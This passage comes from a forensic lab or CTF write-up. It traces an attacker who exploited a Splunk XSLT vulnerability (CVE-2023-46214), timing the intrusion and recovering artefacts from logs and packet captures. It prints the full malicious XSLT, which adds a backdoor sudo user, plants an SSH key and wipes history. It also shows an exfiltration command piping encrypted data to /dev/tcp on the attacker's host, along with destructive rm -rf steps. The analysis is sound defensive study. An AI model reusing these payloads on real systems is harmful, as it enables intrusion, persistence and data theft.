<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;xsl:stylesheet</span> <span style="color:#50fa7b">version=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span> <span style="color:#50fa7b">xmlns:xsl=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/1999/XSL/Transform&#34;</span> <span style="color:#50fa7b">xmlns:exsl=</span><span style="color:#f1fa8c">&#34;http://exslt.org/common&#34;</span> <span style="color:#50fa7b">extension-element-prefixes=</span><span style="color:#f1fa8c">&#34;exsl&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;xsl:template</span> <span style="color:#50fa7b">match=</span><span style="color:#f1fa8c">&#34;/&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;exsl:document</span> <span style="color:#50fa7b">href=</span><span style="color:#f1fa8c">&#34;/opt/splunk/bin/scripts/search.sh&#34;</span> <span style="color:#50fa7b">method=</span><span style="color:#f1fa8c">&#34;text&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;xsl:text&gt;</span>#!/bin/bash&amp;#10;adduser --shell /bin/bash --gecos nginx --quiet --disabled-password --home /var/www/ nginx&amp;#10;access=$(echo MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev)&amp;#10;echo &amp;quot;nginx:$access&amp;quot; | chpasswd&amp;#10;usermod -aG sudo nginx&amp;#10;mkdir /var/www/.ssh&amp;#10;echo &amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKoougbBG5oQuAQWW2JcHY/ZN49jmeegLqgVlimxv42SfFXcuRgUoyostBB6HnHB5lKxjrBmG/183q1AWn6HBmHpbzjZZqKwSfKgap34COp9b+E9oIgsu12lA1I7TpOw1S6AE71d4iPj5pFFxpUbSG7zJaQ2CAh1qK/0RXioZYbEGYDKVQc7ivd1TBvt0puoogWxllsCUTlJxyQXg2OcDA/8enLh+8UFKIvZy4Ylr4zNY4DyHmwVDL06hcjTfCP4T/JWHf8ShEld15gjuF1hZXOuQY4qwit/oYRN789mq2Ke+Azp0wEo/wTNHeY9OSQOn04zGQH/bLfnjJuq1KQYUUHRCE1CXjUt4cxazQHnNeVWlGOn5Dklb/CwkIcarX4cYQM36rqMusTPPvaGmIbcWiXw9J3ax/QB2DR3dF31znW4g5vHjYYrFeKmcZU1+DCUx075nJEVjy+QDTMQvRXW9Jev6OApHVLZc6Lx8nNm8c6X6s4qBSu8EcLLWYFWIwxqE= support@nginx.org&amp;quot; &amp;gt; /var/www/.ssh/authorized_keys&amp;#10;chown -R nginx:nginx /var/www/&amp;#10;cat /dev/null &amp;gt; /root/.bash_history<span style="color:#ff79c6">&lt;/xsl:text&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/exsl:document&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;/xsl:template&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/xsl:stylesheet&gt;</span>
</span></span></code></pre></div><p>Then the TA used Splunks SPL Query Language to execute the payload.
<img src="images/20240615093453.png" alt="alt text"></p>
<p>Apparently, the TA exploited <a href="https://www.cvedetails.com/cve/CVE-2023-46214/">CVE-2023-46214</a> to compromise the Splunk Server. According to <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46214">NIST</a>: <em>In Splunk Enterprise versions below 9.0.7 and 9.1.2, Splunk Enterprise does not safely sanitize extensible stylesheet language transformations (XSLT) that users supply. This means that an attacker can upload malicious XSLT which can result in remote code execution on the Splunk Enterprise instance.</em></p>
<p>The Splunk Server version was <code>9.0.5</code>. We can confirm this by the following data.
<img src="images/20240615094425.png" alt="alt text"></p>
<p>It&rsquo;s an authenticated remote code execution vulnerability, and the TA used the following credential to log into the Splunk Admin Panel.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>username=johnnyC
</span></span><span style="display:flex;"><span>password=h3Re15j0hnNy
</span></span></code></pre></div><p>Some how the credential was stolen by the TA.</p>
<p>To search for the default time that was before and the default time that was set after, I took a look inside the <code>/var/log</code> directory. And I found two files that seemed archived log.</p>
<p><strong>vmware-network.log</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>+ chmod 0600 /var/log/vmware-network.log
</span></span><span style="display:flex;"><span>+ date
</span></span><span style="display:flex;"><span>+ echo Sun 14 Apr 2024 09:57:59 PM +07 : Executing &#39;/etc/vmware-tools/scripts/vmware/network resume-vm&#39;
</span></span><span style="display:flex;"><span>Sun 14 Apr 2024 09:57:59 PM +07 : Executing &#39;/etc/vmware-tools/scripts/vmware/network resume-vm&#39;
</span></span><span style="display:flex;"><span>+ echo
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>+ dirname /etc/vmware-tools/scripts/vmware/network
</span></span><span style="display:flex;"><span>+ . /etc/vmware-tools/scripts/vmware/../../statechange.subr
</span></span><span style="display:flex;"><span>+ main resume-vm
</span></span><span style="display:flex;"><span>+ exitCode=0
</span></span><span style="display:flex;"><span>+ activeList=/var/run/vmware-active-nics
</span></span><span style="display:flex;"><span>+ WakeNetworkManager
</span></span><span style="display:flex;"><span>+ which dbus-send
</span></span><span style="display:flex;"><span>+ dbusSend=/usr/bin/dbus-send
</span></span><span style="display:flex;"><span>+ rc=0
</span></span><span style="display:flex;"><span>+ [ 0 = 0 ]
</span></span><span style="display:flex;"><span>+ /usr/bin/dbus-send --system --print-reply --dest=org.freedesktop.NetworkManager /org/freedesktop/NetworkManager org.freedesktop.NetworkManager.Enable boolean:true
</span></span><span style="display:flex;"><span>Error org.freedesktop.NetworkManager.AlreadyEnabledOrDisabled: Already enabled
</span></span><span style="display:flex;"><span>+ rc=1
</span></span><span style="display:flex;"><span>+ [ 1 = 0 ]
</span></span><span style="display:flex;"><span>+ /usr/bin/dbus-send --system --print-reply --dest=org.freedesktop.NetworkManager /org/freedesktop/NetworkManager org.freedesktop.NetworkManager.Sleep boolean:false
</span></span><span style="display:flex;"><span>Error org.freedesktop.NetworkManager.AlreadyAsleepOrAwake: Already awake
</span></span><span style="display:flex;"><span>+ rc=1
</span></span><span style="display:flex;"><span>+ [ 1 = 0 ]
</span></span><span style="display:flex;"><span>+ /usr/bin/dbus-send --system --print-reply --dest=org.freedesktop.NetworkManager /org/freedesktop/NetworkManager org.freedesktop.NetworkManager.wake
</span></span><span style="display:flex;"><span>Error org.freedesktop.DBus.Error.UnknownMethod: No such method âwakeâ
</span></span><span style="display:flex;"><span>+ rc=1
</span></span><span style="display:flex;"><span>+ return 1
</span></span><span style="display:flex;"><span>+ exitCode=1
</span></span><span style="display:flex;"><span>+ [ 1 != 0 ]
</span></span><span style="display:flex;"><span>+ sanity_check resume-vm
</span></span><span style="display:flex;"><span>+ which ip
</span></span><span style="display:flex;"><span>+ ip_cmd=/usr/sbin/ip
</span></span><span style="display:flex;"><span>+ which ifconfig
</span></span><span style="display:flex;"><span>+ ifconfig_cmd=
</span></span><span style="display:flex;"><span>+ which ifup
</span></span><span style="display:flex;"><span>+ ifup_cmd=
</span></span><span style="display:flex;"><span>+ which ifdown
</span></span><span style="display:flex;"><span>+ ifdown_cmd=
</span></span><span style="display:flex;"><span>+ [ -z  -a -z /usr/sbin/ip ]
</span></span><span style="display:flex;"><span>+ [ ! -s /var/run/vmware-active-nics ]
</span></span><span style="display:flex;"><span>+ save_active_NIC_list
</span></span><span style="display:flex;"><span>+ local intf_out
</span></span><span style="display:flex;"><span>+ 
</span></span><span style="display:flex;"><span>+ [ -n /usr/sbin/ip ]
</span></span><span style="display:flex;"><span>+ /usr/sbin/ip link show up
</span></span><span style="display:flex;"><span>+ egrep \bUP\b
</span></span><span style="display:flex;"><span>+ awk -F: {print $2}
</span></span><span style="display:flex;"><span>+ /usr/sbin/ip link show lo
</span></span><span style="display:flex;"><span>+ grep -iq link/ether
</span></span><span style="display:flex;"><span>+ grep -iq link/ether
</span></span><span style="display:flex;"><span>+ /usr/sbin/ip link show ens33
</span></span><span style="display:flex;"><span>+ echo ens33
</span></span><span style="display:flex;"><span>+ run_network_script start
</span></span><span style="display:flex;"><span>+ local action=start
</span></span><span style="display:flex;"><span>+ local rc=0
</span></span><span style="display:flex;"><span>+ local script
</span></span><span style="display:flex;"><span>+ true
</span></span><span style="display:flex;"><span>+ exec_systemctl_service start
</span></span><span style="display:flex;"><span>+ local rc=1
</span></span><span style="display:flex;"><span>+ local action=start
</span></span><span style="display:flex;"><span>+ which systemctl
</span></span><span style="display:flex;"><span>+ local ctlcmd=/usr/bin/systemctl
</span></span><span style="display:flex;"><span>+ local service
</span></span><span style="display:flex;"><span>+ [ -z /usr/bin/systemctl ]
</span></span><span style="display:flex;"><span>+ /usr/bin/systemctl status systemd-networkd
</span></span><span style="display:flex;"><span>+ grep -iq not-found
</span></span><span style="display:flex;"><span>+ service=systemd-networkd
</span></span><span style="display:flex;"><span>+ break
</span></span><span style="display:flex;"><span>+ [ -z systemd-networkd ]
</span></span><span style="display:flex;"><span>+ /usr/bin/systemctl start systemd-networkd
</span></span><span style="display:flex;"><span>+ rc=0
</span></span><span style="display:flex;"><span>+ [ 0 = 0 -a systemd-networkd = systemd-networkd -a start = stop ]
</span></span><span style="display:flex;"><span>+ return 0
</span></span><span style="display:flex;"><span>+ [ 0 != 0 ]
</span></span><span style="display:flex;"><span>+ break
</span></span><span style="display:flex;"><span>+ return 0
</span></span><span style="display:flex;"><span>+ rescue_NIC
</span></span><span style="display:flex;"><span>+ local rc=0
</span></span><span style="display:flex;"><span>+ local intf_out
</span></span><span style="display:flex;"><span>+ [ -f /var/run/vmware-active-nics ]
</span></span><span style="display:flex;"><span>+ read nic
</span></span><span style="display:flex;"><span>+ [ -n /usr/sbin/ip ]
</span></span><span style="display:flex;"><span>+ /usr/sbin/ip link show ens33 up
</span></span><span style="display:flex;"><span>+ intf_out=2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000
</span></span><span style="display:flex;"><span>    link/ether 00:0c:29:e1:89:42 brd ff:ff:ff:ff:ff:ff
</span></span><span style="display:flex;"><span>    altname enp2s1
</span></span><span style="display:flex;"><span>+ grep -q UP
</span></span><span style="display:flex;"><span>+ echo 2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000 link/ether 00:0c:29:e1:89:42 brd ff:ff:ff:ff:ff:ff altname enp2s1
</span></span><span style="display:flex;"><span>+ date
</span></span><span style="display:flex;"><span>+ echo Sun 14 Apr 2024 09:57:58 PM +07 [rescue_nic] ens33 is already active.
</span></span><span style="display:flex;"><span>Sun 14 Apr 2024 09:57:58 PM +07 [rescue_nic] ens33 is already active.
</span></span><span style="display:flex;"><span>+ read nic
</span></span><span style="display:flex;"><span>+ rm -f /var/run/vmware-active-nics
</span></span><span style="display:flex;"><span>+ return 0
</span></span><span style="display:flex;"><span>+ exitCode=0
</span></span><span style="display:flex;"><span>+ return 0
</span></span><span style="display:flex;"><span>+ date
</span></span><span style="display:flex;"><span>+ echo Sun 14 Apr 2024 09:57:58 PM +07 : Finished &#39;/etc/vmware-tools/scripts/vmware/network resume-vm&#39;
</span></span><span style="display:flex;"><span>Sun 14 Apr 2024 09:57:58 PM +07 : Finished &#39;/etc/vmware-tools/scripts/vmware/network resume-vm&#39;
</span></span></code></pre></div><p>Found the current Timezone offset which is <code>+07</code>.</p>
<p><strong>vmware-network.2.log</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>+ chmod 0600 /var/log/vmware-network.log
</span></span><span style="display:flex;"><span>+ date
</span></span><span style="display:flex;"><span>+ echo Sat 13 Apr 2024 11:19:41 PM PDT : Executing &#39;/etc/vmware-tools/scripts/vmware/network poweron-vm&#39;
</span></span><span style="display:flex;"><span>Sat 13 Apr 2024 11:19:41 PM PDT : Executing &#39;/etc/vmware-tools/scripts/vmware/network poweron-vm&#39;
</span></span><span style="display:flex;"><span>+ echo
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>+ dirname /etc/vmware-tools/scripts/vmware/network
</span></span><span style="display:flex;"><span>+ . /etc/vmware-tools/scripts/vmware/../../statechange.subr
</span></span><span style="display:flex;"><span>+ main poweron-vm
</span></span><span style="display:flex;"><span>+ exitCode=0
</span></span><span style="display:flex;"><span>+ activeList=/var/run/vmware-active-nics
</span></span><span style="display:flex;"><span>+ rm -f /var/run/vmware-active-nics
</span></span><span style="display:flex;"><span>+ return 0
</span></span><span style="display:flex;"><span>+ date
</span></span><span style="display:flex;"><span>+ echo Sat 13 Apr 2024 11:19:41 PM PDT : Finished &#39;/etc/vmware-tools/scripts/vmware/network poweron-vm&#39;
</span></span><span style="display:flex;"><span>Sat 13 Apr 2024 11:19:41 PM PDT : Finished &#39;/etc/vmware-tools/scripts/vmware/network poweron-vm&#39;
</span></span></code></pre></div><p>We were also able to find the previous Timezone that was set to <code>PDT</code>. Using <a href="https://www.epochconverter.com/timezones">Epoch Converter</a> I was able to find the <code>PDT</code> timezone&rsquo;s offset which were <code>-07</code></p>
<p><img src="images/20240615104930.png" alt="alt text"></p>
<p>Next up we need to calculate the dwell time for <code>nginx</code> user creation to SSH logout session.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat auth.log | grep -i nginx
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu groupadd<span style="color:#ff79c6">[</span>13358<span style="color:#ff79c6">]</span>: group added to /etc/group: <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span>nginx, <span style="color:#8be9fd;font-style:italic">GID</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1002</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu groupadd<span style="color:#ff79c6">[</span>13358<span style="color:#ff79c6">]</span>: group added to /etc/gshadow: <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span>nginx
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu groupadd<span style="color:#ff79c6">[</span>13358<span style="color:#ff79c6">]</span>: new group: <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span>nginx, <span style="color:#8be9fd;font-style:italic">GID</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1002</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu useradd<span style="color:#ff79c6">[</span>13364<span style="color:#ff79c6">]</span>: new user: <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span>nginx, <span style="color:#8be9fd;font-style:italic">UID</span><span style="color:#ff79c6">=</span>1002, <span style="color:#8be9fd;font-style:italic">GID</span><span style="color:#ff79c6">=</span>1002, <span style="color:#8be9fd;font-style:italic">home</span><span style="color:#ff79c6">=</span>/var/www/, <span style="color:#8be9fd;font-style:italic">shell</span><span style="color:#ff79c6">=</span>/bin/bash, <span style="color:#8be9fd;font-style:italic">from</span><span style="color:#ff79c6">=</span>none
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu usermod<span style="color:#ff79c6">[</span>13376<span style="color:#ff79c6">]</span>: change user <span style="color:#f1fa8c">&#39;nginx&#39;</span> password
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu chfn<span style="color:#ff79c6">[</span>13383<span style="color:#ff79c6">]</span>: changed user <span style="color:#f1fa8c">&#39;nginx&#39;</span> information
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu chpasswd<span style="color:#ff79c6">[</span>13394<span style="color:#ff79c6">]</span>: pam_unix<span style="color:#ff79c6">(</span>chpasswd:chauthtok<span style="color:#ff79c6">)</span>: password changed <span style="color:#ff79c6">for</span> nginx
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu usermod<span style="color:#ff79c6">[</span>13397<span style="color:#ff79c6">]</span>: add <span style="color:#f1fa8c">&#39;nginx&#39;</span> to group <span style="color:#f1fa8c">&#39;sudo&#39;</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:13 ubuntu usermod<span style="color:#ff79c6">[</span>13397<span style="color:#ff79c6">]</span>: add <span style="color:#f1fa8c">&#39;nginx&#39;</span> to shadow group <span style="color:#f1fa8c">&#39;sudo&#39;</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:21 ubuntu sshd<span style="color:#ff79c6">[</span>13461<span style="color:#ff79c6">]</span>: Accepted publickey <span style="color:#ff79c6">for</span> nginx from 192.168.222.130 port <span style="color:#bd93f9">43302</span> ssh2: RSA SHA256:zRdVnxnRPJ37HDm5KkRvQbklvc2PfFL3av8W1Jb6QoE
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:21 ubuntu sshd<span style="color:#ff79c6">[</span>13461<span style="color:#ff79c6">]</span>: pam_unix<span style="color:#ff79c6">(</span>sshd:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user nginx by <span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:21 ubuntu systemd-logind<span style="color:#ff79c6">[</span>673<span style="color:#ff79c6">]</span>: New session <span style="color:#bd93f9">7</span> of user nginx.
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:22 ubuntu systemd: pam_unix<span style="color:#ff79c6">(</span>systemd-user:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user nginx by <span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:54 ubuntu sudo:    nginx : <span style="color:#8be9fd;font-style:italic">TTY</span><span style="color:#ff79c6">=</span>pts/2 ; <span style="color:#8be9fd;font-style:italic">PWD</span><span style="color:#ff79c6">=</span>/opt/splunk/bin/scripts ; <span style="color:#8be9fd;font-style:italic">USER</span><span style="color:#ff79c6">=</span>root ; <span style="color:#8be9fd;font-style:italic">COMMAND</span><span style="color:#ff79c6">=</span>/usr/bin/rm -rf search.sh
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:54 ubuntu sudo: pam_unix<span style="color:#ff79c6">(</span>sudo:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user root by nginx<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:59 ubuntu sudo:    nginx : <span style="color:#8be9fd;font-style:italic">TTY</span><span style="color:#ff79c6">=</span>pts/2 ; <span style="color:#8be9fd;font-style:italic">PWD</span><span style="color:#ff79c6">=</span>/opt/splunk/bin/scripts ; <span style="color:#8be9fd;font-style:italic">USER</span><span style="color:#ff79c6">=</span>root ; <span style="color:#8be9fd;font-style:italic">COMMAND</span><span style="color:#ff79c6">=</span>/usr/bin/su
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:59 ubuntu sudo: pam_unix<span style="color:#ff79c6">(</span>sudo:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user root by nginx<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:59 ubuntu su: <span style="color:#ff79c6">(</span>to root<span style="color:#ff79c6">)</span> nginx on pts/2
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:00:59 ubuntu su: pam_unix<span style="color:#ff79c6">(</span>su:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user root by nginx<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:02:21 ubuntu sudo:    nginx : <span style="color:#8be9fd;font-style:italic">TTY</span><span style="color:#ff79c6">=</span>pts/2 ; <span style="color:#8be9fd;font-style:italic">PWD</span><span style="color:#ff79c6">=</span>/var/www ; <span style="color:#8be9fd;font-style:italic">USER</span><span style="color:#ff79c6">=</span>root ; <span style="color:#8be9fd;font-style:italic">COMMAND</span><span style="color:#ff79c6">=</span>/usr/bin/mv /home/johnnycage/Documents/Important.pdf .
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:02:21 ubuntu sudo: pam_unix<span style="color:#ff79c6">(</span>sudo:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user root by nginx<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:02:54 ubuntu sudo:    nginx : <span style="color:#8be9fd;font-style:italic">TTY</span><span style="color:#ff79c6">=</span>pts/2 ; <span style="color:#8be9fd;font-style:italic">PWD</span><span style="color:#ff79c6">=</span>/var/www ; <span style="color:#8be9fd;font-style:italic">USER</span><span style="color:#ff79c6">=</span>root ; <span style="color:#8be9fd;font-style:italic">COMMAND</span><span style="color:#ff79c6">=</span>/usr/bin/openssl enc -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in data.zip
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:02:54 ubuntu sudo: pam_unix<span style="color:#ff79c6">(</span>sudo:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user root by nginx<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:03:01 ubuntu sudo:    nginx : <span style="color:#8be9fd;font-style:italic">TTY</span><span style="color:#ff79c6">=</span>pts/2 ; <span style="color:#8be9fd;font-style:italic">PWD</span><span style="color:#ff79c6">=</span>/var/www ; <span style="color:#8be9fd;font-style:italic">USER</span><span style="color:#ff79c6">=</span>root ; <span style="color:#8be9fd;font-style:italic">COMMAND</span><span style="color:#ff79c6">=</span>/usr/bin/rm -rf data.zip Important.pdf
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:03:01 ubuntu sudo: pam_unix<span style="color:#ff79c6">(</span>sudo:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user root by nginx<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:03:08 ubuntu sshd<span style="color:#ff79c6">[</span>13702<span style="color:#ff79c6">]</span>: Disconnected from user nginx 192.168.222.130 port <span style="color:#bd93f9">43302</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:03:08 ubuntu sshd<span style="color:#ff79c6">[</span>13461<span style="color:#ff79c6">]</span>: pam_unix<span style="color:#ff79c6">(</span>sshd:session<span style="color:#ff79c6">)</span>: session closed <span style="color:#ff79c6">for</span> user nginx
</span></span></code></pre></div><p>The <code>useradd</code> command was issued on  <code>Apr 14 08:00:13</code> and the session for nginx user was closed on <code>Apr 14 08:03:08</code>. I used the [[Time]] resource&rsquo;s Add Subtract Time website to calculate the time difference. It was 2 minutes and 55 seconds.</p>
<p>Then to find the password of the <code>nginx</code> I copied the following snippet from the malicious XSLT file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ <span style="color:#8be9fd;font-style:italic">access</span><span style="color:#ff79c6">=</span><span style="color:#ff79c6">$(</span><span style="color:#8be9fd;font-style:italic">echo</span> MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev<span style="color:#ff79c6">)</span>;<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;nginx:</span><span style="color:#8be9fd;font-style:italic">$access</span><span style="color:#f1fa8c">&#34;</span>;     
</span></span><span style="display:flex;"><span>nginx:f8287ec2-3f9a-4a39-9076-36546ebb6a93
</span></span></code></pre></div><p>The password for the <code>nginx</code> user is stored inside the <code>$access</code> variable.</p>
<p>Task 7 was really hard for me. I first read the attacker <code>.bash_history</code> file and fond the following commands the TA ran.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whoami
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> /opt/splunk/bin/scripts/
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>sudo rm -rf search.sh 
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>sudo su
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> /home/johnnycage/
</span></span><span style="display:flex;"><span>tree
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> ~
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>sudo mv /home/johnnycage/Documents/Important.pdf .
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>zip data.zip *
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>sudo openssl enc -aes-256-cbc -iv <span style="color:#ff79c6">$(</span>cut -c 1-32 <span style="color:#ff79c6">&lt;&lt;&lt;</span> <span style="color:#ff79c6">$(</span>uname -r | md5sum<span style="color:#ff79c6">))</span> -K <span style="color:#ff79c6">$(</span>cut -c 1-64 <span style="color:#ff79c6">&lt;&lt;&lt;</span> <span style="color:#ff79c6">$(</span>date +%s | sha256sum<span style="color:#ff79c6">))</span> -in data.zip | base64 | dd <span style="color:#8be9fd;font-style:italic">conv</span><span style="color:#ff79c6">=</span>ebcdic &gt; /dev/tcp/192.168.222.130/8080
</span></span><span style="display:flex;"><span>sudo rm -rf *
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">exit</span>
</span></span></code></pre></div><p>At a first glance it&rsquo;s a clever trick to hide the used key and iv for the AES-256-CBC algorithm used to encrypt the exfiltrated file. There&rsquo;s a lot of randomness to both the key and iv.</p>
<p>But examining the <code>auth.log</code> we found the plain command that was ran by the <code>nginx</code> user.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ cat auth.log | grep -i .zip               
</span></span><span style="display:flex;"><span>Apr 14 08:02:54 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/openssl enc -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in data.zip
</span></span><span style="display:flex;"><span>Apr 14 08:03:01 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/rm -rf data.zip Important.pdf
</span></span></code></pre></div><p>We found the Key and the IV for the data.zip file. But, unfortunately the TA deleted the files both <code>data.zip</code> and <code>Important.pdf</code>. I scoured the whole OS directories and files to find the file but to my ignorance I completely ignored the <code>capture.pcapng</code> file.</p>
<p>So, I opened up Wireshark again and searched for the port <code>8080</code>.
<img src="images/20240615181116.png" alt="alt text"></p>
<p>I followed the TCP stream and exported the data in <code>ASCII</code> format.
<img src="images/20240615181240.png" alt="alt text"></p>
